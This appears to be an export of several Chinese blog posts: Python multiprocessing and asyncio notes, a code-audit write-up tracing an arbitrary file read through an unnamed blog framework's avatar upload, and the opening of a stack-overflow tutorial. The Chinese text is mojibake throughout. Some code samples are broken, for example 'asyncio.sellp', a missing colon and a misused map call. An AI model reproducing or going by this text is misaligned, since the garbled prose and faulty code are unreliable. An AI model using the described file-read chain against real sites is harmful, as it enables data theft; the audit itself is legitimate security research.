<p><strong>çº¿ç¨‹æ± æ˜¯ä¸èƒ½ç”¨é˜Ÿåˆ—æ¥è¿›è¡Œé€šä¿¡çš„ï¼Œè¦ç”¨ç®¡é“ï¼Œä¹Ÿå°±æ˜¯Pipe</strong></p>
<p>apply_async() å¼‚æ­¥æäº¤ä»»åŠ¡</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">num</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s : %s&#x27;</span> % (num, os.getpid()))</span><br><span class="line">    <span class="keyword">return</span> num ** <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Pool()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        res = p.apply_async(task, args=(i,))</span><br><span class="line">        <span class="built_in">print</span>(res.get())</span><br></pre></td></tr></table></figure>

<p>åªèƒ½é€šè¿‡.get()å¾—åˆ°è¿”å›å€¼</p>
<p>é€šè¿‡å¼‚æ­¥çš„æ–¹å¼å–è¿”å›å€¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">task</span>(<span class="params">num</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s : %s&#x27;</span> % (num, os.getpid()))</span><br><span class="line">    <span class="keyword">return</span> num ** <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Pool()</span><br><span class="line">    res_lst = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        res = p.apply_async(task, args=(i,))     <span class="comment"># å…ˆæŠŠä»»åŠ¡å…¨æäº¤</span></span><br><span class="line">        res_lst.append(res)</span><br><span class="line">    <span class="keyword">for</span> res <span class="keyword">in</span> res_lst:</span><br><span class="line">        <span class="built_in">print</span>(res.get())  <span class="comment"># getæœ¬èº«å°±æœ‰é˜»å¡çš„æ•ˆæœäº†ï¼Œå°±ä¸éœ€è¦joinå†é˜»å¡ä¸€æ¬¡äº†,è°å…ˆæ‹¿åˆ°ç»“æœå…ˆå–è°å°±è¡Œäº†</span></span><br></pre></td></tr></table></figure>

<p>ç”¨map()æäº¤ä»»åŠ¡æ—¶å–è¿”å›å€¼</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> Pool,Queue,Pipe</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">q</span>):</span><br><span class="line">    <span class="built_in">print</span>(q)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> q</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = Pool()</span><br><span class="line">    ret = <span class="built_in">map</span>(func, <span class="built_in">range</span>(<span class="number">20</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ret:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;--&gt;&#x27;</span>, i)    </span><br></pre></td></tr></table></figure>

<h1 id="å¼‚æ­¥"><a href="#å¼‚æ­¥" class="headerlink" title="å¼‚æ­¥"></a><center>å¼‚æ­¥</center></h1><h2 id="åç¨‹"><a href="#åç¨‹" class="headerlink" title="åç¨‹"></a>åç¨‹</h2><p>è®©ä¸€ä¸ªçº¿ç¨‹åœ¨ä»£ç ä¸­æ¥å›åˆ‡æ¢æ¸¸èµ°ã€‚</p>
<p>åç¨‹ï¼ˆCorourineï¼‰ï¼Œä¹Ÿå¯ä»¥ç§°ä¸ºå¾®çº¿ç¨‹ï¼Œæ˜¯ä¸€ç§ç”¨æˆ·æ€å†…çš„ä¸Šä¸‹æ–‡åˆ‡æ¢æŠ€æœ¯ã€‚ç®€è€Œè¨€ä¹‹ï¼Œå…¶å®å°±æ˜¯é€šè¿‡ä¸€ä¸ªçº¿ç¨‹å®ç°ä»£ç å—ç›¸äº’åˆ‡æ¢æ‰§è¡Œã€‚</p>
<p>å®ç°åç¨‹çš„æ–¹æ³•çš„ä¸»æµæ–¹æ³•</p>
<p>asyncã€awaitå…³é”®å­—ï¼ˆ&gt;Python3.5ï¼‰</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sellp(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func2</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sellp(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">tasks = [</span><br><span class="line">    asyncio.ensure_future(func1()),</span><br><span class="line">    asyncio.ensure_future(func2())</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># å»ç”Ÿæˆä¸€ä¸ªäº‹ä»¶å¾ªç¯</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"><span class="comment"># å°†ä»»åŠ¡æ”¾åˆ°ä»»åŠ¡åˆ—è¡¨</span></span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br></pre></td></tr></table></figure>

<ul>
<li><p>åç¨‹çš„æ„ä¹‰</p>
<p>  åœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­é‡åˆ°å¦‚æœé‡åˆ°IOç­‰å¾…æ—¶é—´ï¼Œçº¿ç¨‹ä¸ä¼šç­‰å¾…ï¼Œåˆ©ç”¨ç©ºé—²çš„æ—¶é—´å†å»åšå…¶ä»–çš„äº‹æƒ…ã€‚</p>
</li>
</ul>
<h2 id="asyncioäº‹ä»¶å¾ªç¯"><a href="#asyncioäº‹ä»¶å¾ªç¯" class="headerlink" title="asyncioäº‹ä»¶å¾ªç¯"></a>asyncioäº‹ä»¶å¾ªç¯</h2><p> ä¹Ÿå°±æ˜¯ä¸€ä¸ªæ­»å¾ªç¯ï¼Œå»æ£€æµ‹å¹¶æ‰§è¡ŒæŸäº›ä»£ç </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ä¼ªä»£ç </span></span><br><span class="line"></span><br><span class="line">ä»»åŠ¡åˆ—è¡¨ = [ä»»åŠ¡<span class="number">1</span>ï¼Œ ä»»åŠ¡<span class="number">2</span>ï¼Œ ä»»åŠ¡<span class="number">3</span>ï¼Œã€‚ã€‚ã€‚ã€‚]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    å¯æ‰§è¡Œçš„ä»»åŠ¡åˆ—è¡¨ï¼Œå·²å®Œæˆçš„ä»»åŠ¡åˆ—è¡¨ = å»ä»»åŠ¡åˆ—è¡¨ä¸­æ£€æŸ¥æ‰€æœ‰ä»»åŠ¡ï¼Œå°†<span class="string">&#x27;å¯æ‰§è¡Œ&#x27;</span>å’Œ<span class="string">&#x27;å·²æ‰§è¡Œ&#x27;</span>çš„ä»»åŠ¡è¿”å›</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> å°±ç»ªä»»åŠ¡ <span class="keyword">in</span> å¯æ‰§è¡Œä»»åŠ¡åˆ—è¡¨:</span><br><span class="line">        æ‰§è¡Œå·²å°±ç»ªçš„ä»»åŠ¡</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> å·²å®Œæˆçš„ä»»åŠ¡ <span class="keyword">in</span> å·²å®Œæˆçš„ä»»åŠ¡åˆ—è¡¨:</span><br><span class="line">        åœ¨ä»»åŠ¡åˆ—è¡¨ä¸­ç§»é™¤ å·²å®Œæˆçš„ä»»åŠ¡</span><br><span class="line">        </span><br><span class="line">    å¦‚æœ ä»»åŠ¡åˆ—è¡¨ ä¸­çš„ä»»åŠ¡éƒ½å·²å®Œæˆï¼Œåˆ™ç»ˆæ­¢å¾ªç¯</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å®ä¾‹</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tasks = [</span><br><span class="line">    asyncio.ensure_future(func1()),</span><br><span class="line">    asyncio.ensure_future(func2())</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># å»ç”Ÿæˆä¸€ä¸ªäº‹ä»¶å¾ªç¯</span></span><br><span class="line">loop = asyncio.get_event_loop()</span><br><span class="line"><span class="comment"># å°†ä»»åŠ¡æ”¾åˆ°ä»»åŠ¡åˆ—è¡¨</span></span><br><span class="line">loop.run_until_complete(asyncio.wait(tasks))</span><br></pre></td></tr></table></figure>



<ul>
<li><p>åç¨‹å‡½æ•°</p>
<ul>
<li>å®šä¹‰å‡½æ•°çš„æ—¶å€™<code>async def å‡½æ•°å</code></li>
</ul>
</li>
<li><p>åç¨‹å¯¹è±¡</p>
<ul>
<li>æ‰§è¡Œåç¨‹å‡½æ•°()å¾—åˆ°çš„å°±æ˜¯åç¨‹å¯¹è±¡</li>
</ul>
</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">result = func()</span><br></pre></td></tr></table></figure>

<p><strong>æ‰§è¡Œåç¨‹å‡½æ•°åˆ›å»ºåç¨‹å¯¹è±¡ï¼Œå‡½æ•°å†…éƒ¨ä¸ä¼šæ‰§è¡Œä»£ç </strong></p>
<p>å¦‚æœæƒ³è¦è¿è¡Œåç¨‹å‡½æ•°å†…éƒ¨ä»£ç ï¼Œå¿…é¡»è¦æŠŠåç¨‹å¯¹è±¡äº¤ç»™äº‹ä»¶å¾ªç¯æ¥å¤„ç†ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    </span><br><span class="line">q = func()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Python &gt; 3.7</span></span><br><span class="line">asyncio.run(q)</span><br></pre></td></tr></table></figure>



<h2 id="awaitå…³é”®å­—"><a href="#awaitå…³é”®å­—" class="headerlink" title="awaitå…³é”®å­—"></a>awaitå…³é”®å­—</h2><p>await+å¯ç­‰å¾…å¯¹è±¡ï¼ˆåç¨‹å¯¹è±¡ã€Futureã€Taskå¯¹è±¡ï¼‰</p>
<p>  awaitå°±æ˜¯ç­‰å¾…å¯¹è±¡çš„å€¼å¾—åˆ°ç»“æœä¹‹ååœ¨ç»§ç»­å‘ä¸‹èµ°</p>
<p>ç¤ºä¾‹1ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func1</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    response = <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line">asyncio.run( func1() )</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>ç¤ºä¾‹2ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">others</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;è¿”å›å€¼&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">func</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;æ‰§è¡Œåç¨‹å‡½æ•°å†…éƒ¨ä»£ç &#x27;</span>)</span><br><span class="line"></span><br><span class="line">    response = <span class="keyword">await</span> others()</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;IOè¯·æ±‚ç»“æŸï¼Œç»“æœä¸ºï¼š&#x27;</span>, response)</span><br><span class="line"></span><br><span class="line">asyncio.run( func() )</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Taskå¯¹è±¡"><a href="#Taskå¯¹è±¡" class="headerlink" title="Taskå¯¹è±¡"></a>Taskå¯¹è±¡</h2><p>åœ¨äº‹ä»¶å¾ªç¯ä¸­æ·»åŠ å¤šä¸ªä»»åŠ¡</p>
<p>Taskå¯¹è±¡ç”¨äºå¹¶å‘çš„è°ƒåº¦åç¨‹ï¼Œé€šè¿‡<code>asyncio.create_task(åç¨‹å¯¹è±¡)</code>çš„æ–¹å¼åˆ›å»ºTaskå¯¹è±¡ï¼Œè¿™æ ·å¯ä»¥è®©åç¨‹åŠ å…¥äº‹ä»¶å¾ªç¯å½“ä¸­ç­‰å¾…è¢«è°ƒåº¦æ‰§è¡Œã€‚é™¤äº†ä½¿ç”¨<code>asyncio.create_task()</code>å‡½æ•°ä»¥å¤–ï¼Œè¿˜å¯ä»¥ç”¨ä½å±‚çš„<code>loop.create_task()</code>æˆ–<code>ensure_future()</code>å‡½æ•°ã€‚<strong>ä¸å»ºè®®æ‰‹åŠ¨å®ä¾‹åŒ–taskå¯¹è±¡ã€‚</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">others</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;start&quot;</span>)</span><br><span class="line">    <span class="keyword">await</span> asyncio.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;end&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;è¿”å›å€¼&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;mainå¼€å§‹&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å°†ä»»åŠ¡æ·»åŠ åˆ°äº‹ä»¶å¾ªç¯</span></span><br><span class="line">    task_list = [</span><br><span class="line">        asyncio.Task(others(), name=<span class="string">&#x27;n1&#x27;</span>),</span><br><span class="line">        asyncio.Task(others(), name=<span class="string">&quot;n2&quot;</span>)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;mainç»“æŸ&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># doneæ˜¯ä¸€ä¸ªé›†åˆ</span></span><br><span class="line">    done,pending = <span class="keyword">await</span> asyncio.wait(task_list, timeout=<span class="literal">None</span>)</span><br><span class="line">    <span class="built_in">print</span>(done)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºäº‹ä»¶å¾ªç¯</span></span><br><span class="line">asyncio.run(main())</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="concurrent-futures-Future-å¯¹è±¡"><a href="#concurrent-futures-Future-å¯¹è±¡" class="headerlink" title="concurrent.futures.Future()å¯¹è±¡"></a>concurrent.futures.Future()å¯¹è±¡</h2><p>ä½¿ç”¨çº¿ç¨‹æ± ã€è¿›ç¨‹æ± å®ç°å¼‚æ­¥æ“ä½œæ—¶ç”¨åˆ°çš„å¯¹è±¡ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> Future</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.thread <span class="keyword">import</span> ThreadPoolExecutor</span><br><span class="line"><span class="keyword">from</span> concurrent.futures.process <span class="keyword">import</span> ProcessPoolExecutor</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">value</span>):</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(value)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">123</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªçº¿ç¨‹æ± </span></span><br><span class="line">pool = ThreadPoolExecutor(max_workers=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆ›å»ºè¿›ç¨‹æ± </span></span><br><span class="line">pool1 = ProcessPoolExecutor(max_workers=<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    fut = pool.submit(func, i)</span><br><span class="line">    <span class="built_in">print</span>(fut)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>ä»¥åå¯èƒ½å­˜åœ¨äº¤å‰ä½¿ç”¨ã€‚</p>
<p>å¤šä¸ªæ–¹æ³•çš„æ—¶å€™ï¼Œå°±å›è°ƒå‡½æ•°</p>
<p>åŸºäºå¤šçº¿ç¨‹å®ç°çš„å¼‚æ­¥</p>
<p>CPUå¯†é›†å‹ç”¨å¤šè¿›ç¨‹ï¼ŒIOå¯†é›†å‹ç”¨å¼‚æ­¥</p>
<h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a><center>æ€»ç»“</center></h1><ul>
<li><p>ä¿¡å·é‡ï¼Œå¤šè¿›ç¨‹ï¼Œè¿›ç¨‹æ± çš„åŒºåˆ«  </p>
<p>  <strong>ä¿¡å·é‡</strong>ï¼šå¦‚æœæœ‰500ä»¶è¡£æœè¦åšï¼Œäºæ˜¯æ‹›äº†500ä¸ªäººï¼Œåªæœ‰4å°æœºå™¨ï¼Œè°å®Œæˆä»»åŠ¡äº†å†è¿›å‡ ä¸ªäººï¼Œä¹Ÿå°±æ˜¯4ä¸ªä¿¡å·é‡ï¼Œ500ä¸ªè¿›ç¨‹ï¼Œæœºå™¨æ˜¯cpuï¼Œ4ä¸ªcpuï¼Œæ¯ä¸ªäººæ˜¯æ¯ä¸ªè¿›ç¨‹ï¼Œæ¯ä»¶è¡£æœæ˜¯ä¸€ä¸ªä»»åŠ¡  </p>
<p>  <strong>å¤šè¿›ç¨‹</strong>ï¼š500ä¸ªäººæŠ¢å››å°æœºå™¨ï¼Œæ¯ä¸ªäººåªèƒ½å·¥ä½œååˆ†é’Ÿï¼Œç›¸å¯¹äºæ—¶é—´ç‰‡ï¼Œä¸ç®¡åšæ²¡æœ‰åšå®Œï¼Œå°±èµ°äº†ï¼Œå°±æ˜¯500ä¸ªè¿›ç¨‹åš500ä¸ªä»»åŠ¡  </p>
<p>  <strong>è¿›ç¨‹æ± </strong>ï¼š4ä¸ªäººåš500ä»¶è¡£æœï¼Œ4å°æœºå™¨ï¼Œè°æ¥è°å°±å¯ä»¥åšè¡£æœã€‚è€Œå¯¹äºå¤šè¿›ç¨‹æ¥è¯´ï¼Œæ“ä½œç³»ç»Ÿæ¥è°ƒåº¦500ä¸ªäººè°ç”¨æœºå™¨ï¼Œè°ä¸ç”¨æœºå™¨ï¼Œå’Œè°ƒåº¦4ä¸ªäººæ˜¯ä¸ä¸€æ ·çš„ã€‚æ‰€ä»¥ä¸èƒ½æœ‰å‡ ä»¶è¡£æœå°±é›‡å‡ ä¸ªäººï¼Œè€Œæ˜¯éƒ½å‡ å°æœºå™¨å°±é›‡å‡ ä¸ªäººã€‚è¿™æ ·äººéƒ½è½¬èµ·æ¥äº†ï¼Œå¹¶ä¸”éƒ½èƒ½å®Œæˆä»»åŠ¡ã€‚è€Œä¸”å·¥å‚è´Ÿæ‹…ä¹Ÿå°ä¸€ç‚¹ï¼Œè¿™å°±æ˜¯æ± çš„æ¦‚å¿µã€‚</p>
</li>
</ul>
<p>CPUå¯†é›†ç”¨å¤šè¿›ç¨‹ï¼ŒIOå¯†é›†ç”¨å¼‚æ­¥åç¨‹</p>
]]></content>
      <categories>
        <category>å·¥å…·</category>
      </categories>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>è®°æŸæ¬¡ä»£ç å®¡è®¡</title>
    <url>/read/%E8%AE%B0%E4%B8%80%E6%AC%A1%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æŸä¸ªåšå®¢æ¡†æ¶çš„æœ€æ–°ç‰ˆ</p>
<span id="more"></span>

<h1 id="è°ƒç”¨é“¾åˆ†æ"><a href="#è°ƒç”¨é“¾åˆ†æ" class="headerlink" title="è°ƒç”¨é“¾åˆ†æ"></a>è°ƒç”¨é“¾åˆ†æ</h1><ul>
<li>äº <code>include.lib.function.base.php</code> å¤„å‘ç°ä¸€ä¸ª<code>file_get_contents</code> å‡½æ•°ï¼š</li>
</ul>
<p>   <img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_Q4KCHYHMR9.png"></p>
<ul>
<li><p>å›è°ƒ<code>imageCropAndResize</code> æ–¹æ³•çœ‹<code>src_image</code> å‚æ•°æ˜¯å¦å¯æ§</p>
<p>åˆäºè¯¥æ–‡ä»¶å¤¹ä¸­å‘ç°<code>resizeImage</code> æ–¹æ³•è°ƒç”¨äº†<code>imageCropAndResize</code> æ–¹æ³•</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage__utB-_B7hI.png"></p>
</li>
<li><p>å›è°ƒ</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_AZePoqLEO8.png"></p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_Q1D3dnAZpY.png"></p>
<p>ç”±ä¸Šå›¾å¯è§tmpFileå¯æ§</p>
</li>
<li><p>å›è°ƒï¼Œå¾—åˆ°è¿‡æ»¤è§„åˆ™</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_lV8PsVFEq5.png"></p>
</li>
<li><p>å›è°ƒ</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_M2IXbbl6Iv.png"></p>
<p>å¤´åƒä¸Šä¼ å¤„çš„åŠŸèƒ½ç‚¹çš„tmpFileå‚æ•°</p>
</li>
<li><p>å›è°ƒï¼Œå³å¯å‘ç°æœ€å¼€å§‹è°ƒç”¨çš„ä½ç½®ã€‚</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_NK059U6L02.png"></p>
</li>
</ul>
<h1 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h1><p><code>include.lib.[function.base.php]</code> &lt;-<code>imageCropAndResize </code> &lt;-<code>resizeImage</code>&lt;-<code>upload</code> &lt;-<code>upload2local</code> &lt;-<code>uploadCropImg</code> &lt;- <code>admin.blogger.php</code>;</p>
<ul>
<li><p>è°ƒè¯•å¯çŸ¥<code>tmpFile</code>å‚æ•°ä¸ºä¸´æ—¶æ–‡ä»¶å</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_i6HyBtdKL5.png"></p>
<p>å¯ä»¥é€šè¿‡POSTçš„æ–¹å¼ä¸Šä¼ æ–‡ä»¶ï¼Œå¯¹<code>$_FILES</code>æ•°ç»„äº§ç”Ÿå½±å“ï¼Œè¿›è€Œå½±å“tmp_nameï¼Œå¯¼è‡´ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p>
</li>
</ul>
<p>éªŒè¯</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownimage_QdZKgnQGsQ.png"></p>
]]></content>
      <categories>
        <category>Webå®‰å…¨</category>
      </categories>
      <tags>
        <tag>PHP</tag>
        <tag>ä»£å®¡</tag>
      </tags>
  </entry>
  <entry>
    <title>æ ˆæº¢å‡º</title>
    <url>/PWN/%E6%A0%88%E6%BA%A2%E5%87%BA/</url>
    <content><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>ç ”ç©¶äº†ä¸€æ®µæ—¶é—´ï¼Œåšä¸ªæ€»ç»“ã€‚</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownoabOhk5WZ26NEXg.png"></p>
<span id="more"></span>

<h1 id="æ ˆï¼ˆstackï¼‰"><a href="#æ ˆï¼ˆstackï¼‰" class="headerlink" title="æ ˆï¼ˆstackï¼‰"></a>æ ˆï¼ˆstackï¼‰</h1><p>æ ˆæ˜¯ä¸€ç§å…¸å‹çš„åè¿›å…ˆå‡º <code>(Last in First Out)</code> çš„æ•°æ®ç»“æ„ï¼Œå…¶æ“ä½œä¸»è¦æœ‰<code>å‹æ ˆ (push)</code> ä¸<code>å‡ºæ ˆ (pop)</code> ä¸¤ç§æ“ä½œï¼Œå¦‚ä¸‹å›¾æ‰€ç¤ºã€‚ä¸¤ç§æ“ä½œéƒ½æ“ä½œæ ˆé¡¶ï¼Œå½“ç„¶ï¼Œå®ƒä¹Ÿæœ‰æ ˆåº•ã€‚</p>
<p><img src="https://gallery-1304405887.cos.ap-nanjing.myqcloud.com/markdownP6wHiXuI2TCKBUj.png"></p>
<p>é«˜çº§è¯­è¨€åœ¨è¿è¡Œæ—¶éƒ½ä¼šè¢«è½¬æ¢ä¸ºæ±‡ç¼–ç¨‹åºï¼Œåœ¨æ±‡ç¼–ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­ï¼Œå……åˆ†åˆ©ç”¨äº†è¿™ä¸€æ•°æ®ç»“æ„ã€‚æ¯ä¸ªç¨‹åºåœ¨è¿è¡Œæ—¶éƒ½æœ‰è™šæ‹Ÿåœ°å€ç©ºé—´ï¼Œå…¶ä¸­æŸä¸€éƒ¨åˆ†å°±æ˜¯è¯¥ç¨‹åºå¯¹åº”çš„æ ˆï¼Œç”¨äºä¿å­˜å‡½æ•°è°ƒç”¨ä¿¡æ¯å’Œå±€éƒ¨å˜é‡ã€‚æ­¤å¤–ï¼Œå¸¸è§çš„æ“ä½œä¹Ÿæ˜¯å‹æ ˆä¸å‡ºæ ˆã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ<strong>ç¨‹åºçš„æ ˆæ˜¯ä»è¿›ç¨‹åœ°å€ç©ºé—´çš„é«˜åœ°å€å‘ä½åœ°å€å¢é•¿çš„</strong>ã€‚</p>
<p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ32 ä½å’Œ 64 ä½ç¨‹åºæœ‰ä»¥ä¸‹ç®€å•çš„åŒºåˆ«</p>
<ul>
<li><strong>x86</strong><ul>
<li><strong>å‡½æ•°å‚æ•°</strong>åœ¨<strong>å‡½æ•°è¿”å›åœ°å€</strong>çš„ä¸Šæ–¹</li>
</ul>
</li>
<li><strong>x64</strong><ul>
<li>System V AMD64 ABI (Linuxã€FreeBSDã€macOS ç­‰é‡‡ç”¨) ä¸­å‰å…­ä¸ªæ•´å‹æˆ–æŒ‡é’ˆå‚æ•°ä¾æ¬¡ä¿å­˜åœ¨ <strong>RDI, RSI, RDX, RCX, R8 å’Œ R9 å¯„å­˜å™¨</strong>ä¸­ï¼Œå¦‚æœè¿˜æœ‰æ›´å¤šçš„å‚æ•°çš„è¯æ‰ä¼šä¿å­˜åœ¨æ ˆä¸Šã€‚</li>
<li>å†…å­˜åœ°å€ä¸èƒ½å¤§äº 0x00007FFFFFFFFFFFï¼Œ<strong>6 ä¸ªå­—èŠ‚é•¿åº¦</strong>ï¼Œå¦åˆ™ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚</li>
</ul>
</li>
</ul>
